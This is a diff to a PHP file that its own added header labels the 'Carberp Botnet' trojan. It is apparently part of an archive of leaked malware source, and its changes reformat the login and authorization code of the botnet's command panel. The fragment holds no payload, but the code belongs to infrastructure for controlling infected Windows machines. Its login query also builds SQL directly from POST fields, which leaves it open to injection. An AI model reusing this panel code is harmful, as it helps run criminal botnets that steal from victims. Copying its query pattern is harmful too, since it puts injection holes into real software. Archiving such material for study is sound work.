@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 /*
@@ -50,7 +61,9 @@ if(!empty($_SERVER["HTTP_X_REAL_IP"])){
 	$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_X_REAL_IP"];
 }
 
-if($config['autorize_key'] == true){	if($_SESSION['akey'] != $config['akey']){		get_function('first');
+if($config['autorize_key'] == true){
+	if($_SESSION['akey'] != $config['akey']){
+		get_function('first');
   		$dir = '';
   		no_found();
 	}
@@ -71,7 +84,10 @@ $func[] = 'openssl_decrypt';
 $func[] = 'mb_convert_encoding';
 //$func[] = 'pcntl_fork';
 
-if(count($func) > 0){	foreach($func as $value){		if(!function_exists($value)){			print('function "'.$value.'" is unknown');
+if(count($func) > 0){
+	foreach($func as $value){
+		if(!function_exists($value)){
+			print('function "'.$value.'" is unknown');
 			exit;
 		}
 	}
@@ -107,12 +123,14 @@ if($row->url == $cebn || file_exists('cache/cebn.txt') || file_exists('cache/sma
 	//Cend
 }
 
-if(isset($_POST['autorize_submit']) && !empty($_POST['login']) && !empty($_POST['password'])){	array_walk($_POST, 'real_escape_string');
+if(isset($_POST['autorize_submit']) && !empty($_POST['login']) && !empty($_POST['password'])){
+	array_walk($_POST, 'real_escape_string');
 	array_walk($_COOKIE, 'real_escape_string');
 
 	$result = $mysqli->query("SELECT * FROM bf_users WHERE (login='".$_POST['login']."') AND (password='".$_POST['password']."') AND (enable='1') LIMIT 1");
 
-	if($result->login == strtolower($_POST['login'])){		$_POST['info'] = json_decode(base64_decode($_POST['info']));
+	if($result->login == strtolower($_POST['login'])){
+		$_POST['info'] = json_decode(base64_decode($_POST['info']));
 		$_POST['info']->REMOTE_PORT = $_SERVER["REMOTE_PORT"];
 		$_POST['info']->REMOTE_ADDR = $_SERVER["REMOTE_ADDR"];
 		$_POST['info']->HTTP_USER_AGENT = $_SERVER["HTTP_USER_AGENT"];
@@ -132,7 +150,8 @@ if(isset($_POST['autorize_submit']) && !empty($_POST['login']) && !empty($_POST[
 
 		if($_POST['hidden'] != 'on'){
 			$mysqli->query("update bf_users set PHPSESSID='".$_SESSION['user']->PHPSESSID."', enter_date=CURRENT_TIMESTAMP(), info='".json_encode($_POST['info'])."' WHERE (id='".$_SESSION['user']->id."') LIMIT 1");
-	    }else{	    	$_SESSION['hidden'] = 'on';
+	    }else{
+	    	$_SESSION['hidden'] = 'on';
 	    	$mysqli->query("update bf_users set PHPSESSID='".$_SESSION['user']->PHPSESSID."' WHERE (id='".$_SESSION['user']->id."') LIMIT 1");
 	    }
 
